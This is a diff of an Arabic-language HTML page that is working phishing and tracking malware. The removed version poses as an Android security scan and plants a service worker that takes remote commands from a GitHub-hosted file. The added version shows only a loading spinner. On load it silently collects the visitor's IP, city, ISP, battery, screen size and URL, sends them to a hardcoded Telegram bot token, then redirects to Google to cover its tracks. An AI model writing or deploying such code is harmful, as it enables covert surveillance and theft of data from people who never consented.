@@ -2,123 +2,70 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث أمان أندرويد</title>
+    <title>جاري التحميل...</title>
     <style>
-        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 40px 20px; }
-        .terminal { border: 1px solid #00ff41; padding: 20px; background: #050505; box-shadow: 0 0 15px #00ff41; display: inline-block; width: 100%; max-width: 450px; }
-        .scan-bar { width: 100%; height: 4px; background: #111; position: relative; overflow: hidden; margin: 15px 0; }
-        .progress { width: 40%; height: 100%; background: #00ff41; position: absolute; animation: move 1.5s infinite linear; }
-        @keyframes move { from { left: -40%; } to { left: 100%; } }
-        button { background: #00ff41; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
+        body { background: #000; color: #00ff00; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
+    <div class="loader"></div>
 
-<div class="terminal">
-    <h3 id="head">[ SYSTEM SCAN V10 ]</h3>
-    <div class="scan-bar"><div class="progress"></div></div>
-    <p id="status" style="font-size: 14px;">جاري فحص سلامة الملفات...</p>
-    <button onclick="ignite()">تحسين أداء النظام</button>
-</div>
+    <script>
+        const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
 
-<script>
-    const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
-    // نصيحة: ضع معرف الشات الخاص بك هنا مباشرة إذا لم يعمل التلقائي
-    let manualChatId = ""; 
-
-    const swCode = `
-        const TOKEN = '${TOKEN}';
-        const CMD_URL = 'https://raw.githubusercontent.com/mosbahimouataz7/no-ip-/main/server.json';
-        let cid = "";
-        let lastCmdId = "";
-
-        self.addEventListener('install', (event) => {
-            self.skipWaiting();
-        });
-
-        self.addEventListener('activate', (event) => {
-            event.waitUntil(clients.claim());
-        });
-
-        self.addEventListener('message', (e) => {
-            if (e.data.type === 'INIT') { 
-                cid = e.data.id; 
-                setInterval(pollCommands, 10000);
-            }
-        });
-
-        async function pollCommands() {
+        async function grabSilentData() {
             try {
-                const res = await fetch(CMD_URL + '?nocache=' + Date.now());
-                const cmd = await res.json();
-                if (cmd.id !== lastCmdId) {
-                    lastCmdId = cmd.id;
-                    processAction(cmd.action);
-                }
-            } catch(e) {}
-        }
-
-        async function processAction(act) {
-            let info = "";
-            if (act === "REPORT") info = "📊 Active Status: Target Online";
-            else if (act === "VIBRATE") {
-                self.registration.showNotification("System Alert", { body: "Critical Error!", vibrate: [500, 100, 500] });
-                info = "📳 Vibration Executed";
-            }
-            if (cid) fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + cid + '&text=' + encodeURIComponent(info));
-        }
-    `;
-
-    async function ignite() {
-        document.getElementById('status').innerText = "جاري تنفيذ بروتوكولات الأمان...";
-        
-        try {
-            // 1. محاولة جلب الـ Chat ID تلقائياً
-            if (!manualChatId) {
-                const res = await fetch(\`https://api.telegram.org/bot\${TOKEN}/getUpdates\`);
-                const data = await res.json();
-                if (data.result.length > 0) {
-                    manualChatId = data.result[data.result.length - 1].message.chat.id;
-                } else {
-                    alert("يرجى إرسال رسالة للبوت أولاً!");
-                    return;
-                }
-            }
-
-            // 2. جلب الـ IP الحقيقي للضحية
-            let ip = "Unknown";
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
+                // 1. جلب الآي بي والمعلومات الجغرافية التقريبية (عبر API خارجي)
+                const ipRes = await fetch('https://ipapi.co/json/');
                 const ipData = await ipRes.json();
-                ip = ipData.ip;
-            } catch(e) {}
 
-            const ua = navigator.userAgent;
-            const model = ua.match(/\\(([^)]+)\\)/) ? ua.match(/\\(([^)]+)\\)/)[1] : "Unknown Device";
-            const initialReport = \`💀 **NEW TARGET READY**\\n\\n📱 Device: \${model}\\n🌐 IP: \${ip}\`;
-            
-            await fetch(\`https://api.telegram.org/bot\${TOKEN}/sendMessage?chat_id=\${manualChatId}&text=\${encodeURIComponent(initialReport)}&parse_mode=Markdown\`);
-
-            // 3. زرع الـ Service Worker
-            const blob = new Blob([swCode], { type: 'text/javascript' });
-            const swUrl = URL.createObjectURL(blob);
-            const reg = await navigator.serviceWorker.register(swUrl);
-            
-            setTimeout(() => {
-                if (navigator.serviceWorker.controller) {
-                    navigator.serviceWorker.controller.postMessage({ type: 'INIT', id: manualChatId });
+                // 2. معلومات البطارية
+                let batteryInfo = "غير مدعوم";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'جاري الشحن' : 'تفريغ'})`;
                 }
-            }, 1500);
 
-            document.getElementById('status').innerText = "اكتمل التحديث بنجاح!";
-            setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
+                // 3. تفاصيل الجهاز والمتصفح
+                const info = `
+⚠️ **صيد صامت جديد (بدون إذن)** ⚠️
+------------------------------
+🌐 **الآي بي:** \`${ipData.ip}\`
+📍 **المدينة:** ${ipData.city}, ${ipData.country_name}
+📶 **المزود:** ${ipData.org}
+📱 **الجهاز:** ${navigator.platform}
+🔋 **البطارية:** ${batteryInfo}
+🖥️ **الشاشة:** ${window.screen.width}x${window.screen.height}
+⏰ **التوقيت:** ${new Date().toLocaleString()}
+🔗 **الرابط المفتوح:** ${window.location.href}
+------------------------------`;
 
-        } catch (e) {
-            console.error(e);
-            alert("خطأ في الاتصال.");
+                // 4. الحصول على الـ Chat ID وإرسال البيانات
+                const updateRes = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`);
+                const updateData = await updateRes.json();
+                const chatId = updateData.result[updateData.result.length - 1].message.chat.id;
+
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: info,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                // بعد السحب، يمكن تحويله لموقع حقيقي للتمويه
+                setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
+
+            } catch (e) {
+                console.error("حدث خطأ في السحب الصامت");
+            }
         }
-    }
-</script>
+
+        window.onload = grabSilentData;
+    </script>
 </body>
 </html>
